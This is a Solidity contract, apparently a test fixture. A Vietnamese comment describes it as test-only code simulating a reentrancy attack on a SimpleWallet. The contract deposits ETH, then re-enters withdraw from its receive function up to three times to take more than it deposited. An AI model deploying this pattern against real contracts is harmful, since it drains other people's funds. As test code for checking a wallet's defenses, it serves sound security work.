// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWallet {
    function depositETH() external payable;
    function withdraw(address token, uint256 amount) external;
}

/// @dev Chi dung cho kiem thu: mo phong tan cong reentrancy vao SimpleWallet.
contract ReentrancyAttacker {
    IWallet public immutable wallet;
    uint256 public rounds;

    constructor(address w) {
        wallet = IWallet(w);
    }

    function attack() external payable {
        wallet.depositETH{value: msg.value}();
        wallet.withdraw(address(0), msg.value);
    }

    receive() external payable {
        if (rounds++ < 3) {
            wallet.withdraw(address(0), msg.value);
        }
    }
}
